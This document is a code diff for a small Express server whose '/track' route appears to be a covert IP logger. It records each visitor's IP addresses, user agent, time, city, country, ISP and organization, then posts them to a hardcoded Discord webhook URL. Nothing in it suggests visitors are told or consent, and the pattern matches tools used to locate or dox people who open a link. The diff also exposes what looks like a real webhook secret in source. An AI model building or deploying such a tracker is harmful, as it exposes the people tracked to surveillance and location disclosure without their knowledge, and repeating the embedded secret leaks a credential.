@@ -4,19 +4,31 @@ import fetch from "node-fetch";
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-const WEBHOOK_URL = "https://discord.com/api/webhooks/1511274000641167400/K-dYT4j9-0dWuvQJ4yKMLR7PWiTEXQ7FpXQSxoFN8pEtER5yyVHpGxvPb0SLkEy4uqMO";
+// Replace with your webhook or use an environment variable
+const WEBHOOK_URL =
+    process.env.WEBHOOK_URL || "https://discord.com/api/webhooks/1511274000641167400/K-dYT4j9-0dWuvQJ4yKMLR7PWiTEXQ7FpXQSxoFN8pEtER5yyVHpGxvPb0SLkEy4uqMO";
 
+// Trust Render / reverse proxies
 app.set("trust proxy", true);
 
-// Home
+// Home page
 app.get("/", (req, res) => {
     res.sendFile("index.html", { root: process.cwd() });
 });
 
-// Track
+// Track route
 app.get("/track", async (req, res) => {
 
-    // Get visitor IP
+    // =========================
+    // IP INFORMATION
+    // =========================
+
+    const forwardedIp =
+        req.headers["x-forwarded-for"] || "None";
+
+    const socketIp =
+        req.socket.remoteAddress || "None";
+
     let ip =
         req.headers["x-forwarded-for"]?.split(",")[0].trim() ||
         req.socket.remoteAddress ||
@@ -25,7 +37,27 @@ app.get("/track", async (req, res) => {
     // Remove IPv4-mapped IPv6 prefix
     ip = ip.replace(/^::ffff:/, "");
 
-    const userAgent = req.headers["user-agent"] || "Unknown";
+    const userAgent =
+        req.headers["user-agent"] || "Unknown";
+
+    // =========================
+    // TIMESTAMP (PH TIME)
+    // =========================
+
+    const timestamp = new Date().toLocaleString("en-PH", {
+        timeZone: "Asia/Manila",
+        year: "numeric",
+        month: "long",
+        day: "numeric",
+        hour: "numeric",
+        minute: "2-digit",
+        second: "2-digit",
+        hour12: true
+    });
+
+    // =========================
+    // GEO LOOKUP
+    // =========================
 
     let city = "Unknown";
     let country = "Unknown";
@@ -34,8 +66,13 @@ app.get("/track", async (req, res) => {
     let ipType = "Unknown";
 
     try {
-        const geoRes = await fetch(`https://ipwho.is/${encodeURIComponent(ip)}`);
+        const geoRes = await fetch(
+            `https://ipwho.is/${encodeURIComponent(ip)}`
+        );
+
         const data = await geoRes.json();
+
+        console.log("Geo Response:", data);
 
         if (data.success) {
             city = data.city || "Unknown";
@@ -48,18 +85,39 @@ app.get("/track", async (req, res) => {
         console.error("Geo lookup failed:", err);
     }
 
+    // =========================
+    // DEBUG LOGS
+    // =========================
+
+    console.log("Chosen IP:", ip);
+    console.log("Forwarded IP:", forwardedIp);
+    console.log("Socket IP:", socketIp);
+
+    // =========================
+    // DISCORD MESSAGE
+    // =========================
+
     const message = `
 🇵🇭 New Visitor Logged
 
-🌍 IP: ${ip}
+🕒 Time: ${timestamp}
+
+🌍 Chosen IP: ${ip}
+📦 Forwarded IP: ${forwardedIp}
+🧠 Socket IP: ${socketIp}
+
 📶 Type: ${ipType}
 
 📍 Location: ${city}, ${country}
 🏢 ISP: ${isp}
-🏢 Org: ${org}
+🏢 Organization: ${org}
 
 🖥️ Device: ${userAgent}
 `;
+
+    // =========================
+    // SEND TO DISCORD
+    // =========================
 
     try {
         await fetch(WEBHOOK_URL, {
@@ -78,6 +136,7 @@ app.get("/track", async (req, res) => {
     res.sendStatus(200);
 });
 
+// Start server
 app.listen(PORT, () => {
     console.log(`Server running on port ${PORT}`);
 });
